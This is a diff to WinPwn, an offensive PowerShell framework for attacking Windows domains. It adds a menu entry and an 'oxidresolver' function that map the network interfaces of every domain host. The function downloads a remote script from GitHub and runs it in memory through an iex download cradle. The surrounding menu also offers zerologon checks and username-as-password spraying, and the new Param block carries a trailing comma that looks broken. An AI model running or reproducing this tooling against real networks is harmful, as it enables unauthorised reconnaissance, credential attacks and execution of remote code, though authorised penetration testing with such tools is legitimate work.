@@ -1886,7 +1886,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '19. Check all DCs for zerologon vulnerability! '
 	Write-Host -ForegroundColor Green '20. Check users for empty passwords! '
 	Write-Host -ForegroundColor Green '21. Check username=password combinations! '
-        Write-Host -ForegroundColor Green '22. Exit. '
+        Write-Host -ForegroundColor Green '22. Get network interface IPs of all domain systems via IOXIDResolver! '
+        Write-Host -ForegroundColor Green '23. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1913,9 +1914,10 @@ __        ___       ____
          19{zerologon}
 	 20{Domainpassspray -emptypasswords}
 	 21{Domainpassspray -usernameaspassword}
+         22{Oxidresolver}
        }
     }
- While ($masterquestion -ne 22)
+ While ($masterquestion -ne 23)
 }
 
 function generaldomaininfo{
@@ -2142,6 +2144,24 @@ function Snaffler
     {
     	Invoke-Snaffler -command "-u"
     }
+}
+
+function oxidresolver
+{
+    [CmdletBinding()]
+
+    Param
+    (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput,
+    )
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-OxidResolver.ps1')
+    if(!$consoleoutput){pathcheck}
+    if(!$consoleoutput){Invoke-Oxidresolver >> "$currentPath\DomainRecon\OxidBindings.txt"}
+    else{Invoke-Oxidresolver}
+
 }
 
 function Spoolvulnscan
